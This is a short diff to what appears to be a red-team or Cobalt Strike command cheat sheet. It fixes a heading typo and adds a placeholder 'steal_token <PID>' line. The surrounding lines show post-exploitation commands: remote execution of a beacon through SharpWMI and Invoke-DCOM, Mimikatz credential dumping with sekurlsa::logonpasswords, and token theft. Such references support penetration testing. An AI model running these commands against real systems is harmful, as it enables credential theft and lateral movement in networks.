@@ -163,7 +163,7 @@ execute-assembly SharpWMI.exe action=exec computername=<HOSTNAME> command="C:\Wi
 powershell Invoke-DCOM -ComputerName <HOSTNAME> -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
 ```
 
-### Credentias
+### Credentials
 #### Mimikatz logonpasswords
 ```
 mimikatz sekurlsa::logonpasswords
@@ -193,6 +193,7 @@ rev2self
 #### Steal token
 ```
 steal_token 3320
+steal_token <PID>
 ````
 
 #### Inject payload into process
